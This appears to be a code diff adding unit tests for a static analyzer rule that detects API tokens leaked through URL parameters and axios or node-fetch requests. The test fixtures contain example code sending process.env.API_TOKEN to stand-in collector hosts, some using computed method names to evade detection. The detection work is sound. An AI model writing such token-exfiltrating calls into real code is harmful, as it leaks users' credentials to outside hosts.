@@ -184,6 +184,72 @@ export async function handler() {
     expect(JSON.stringify(findings)).not.toContain('email');
   });
 
+  it('reports sensitive values added to URL query parameters without exposing them', () => {
+    const findings = analyzeAstSource(
+      'src/outbound.ts',
+      [
+        'const token = process.env.API_TOKEN;',
+        'const url = new URL("https://example.test/collect");',
+        'url.searchParams.set("credential", token);',
+        'const query = new URLSearchParams();',
+        'query.append("access_token", token);',
+        'const fromObject = new URLSearchParams({ api_token: token });',
+        "const setter = 'set';",
+        "url.searchParams[setter]('session', token);",
+        "const appender = 'append';",
+        "query[appender]('session', token);"
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+    expect(findings).toHaveLength(5);
+    expect(
+      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
+    ).toBe(true);
+    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
+  it('treats computed network client methods as outbound disclosure sinks', () => {
+    const findings = analyzeAstSource(
+      'src/outbound.ts',
+      [
+        'const token = process.env.API_TOKEN;',
+        "const client = require('axios');",
+        "client['post']('https://collector.invalid', { headers: { authorization: token } });",
+        'const method = getMethodName();',
+        "client[method]('https://collector.invalid', { headers: { authorization: token } });"
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+
+    expect(findings).toHaveLength(2);
+    expect(
+      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
+    ).toBe(true);
+    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
+  it('recognizes statically imported and required outbound client aliases', () => {
+    const findings = analyzeAstSource(
+      'src/outbound.ts',
+      [
+        "import fetchRemote from 'node-fetch';",
+        "import { Agent } from 'undici';",
+        "const axiosClient = require('axios');",
+        'const token = process.env.API_TOKEN;',
+        "fetchRemote('https://collector.invalid', { headers: { authorization: token } });",
+        "axiosClient['post']('https://collector.invalid', { headers: { authorization: token } });",
+        'Agent({ token });',
+        'function safe(fetchRemote: (url: string) => void) {',
+        "  fetchRemote('https://collector.invalid');",
+        '}'
+      ].join('\n')
+    ).filter((item) => item.ruleId === 'TLP-DATA-001');
+
+    expect(findings).toHaveLength(2);
+    expect(
+      findings.every((item) => item.metadata?.sinkClass === 'outbound-request')
+    ).toBe(true);
+    expect(JSON.stringify(findings)).not.toContain('API_TOKEN');
+  });
+
   it('tracks sensitive request destructuring and unknown serializers without leaking fields', () => {
     const findings = analyzeAstSource(
       'src/profile.ts',
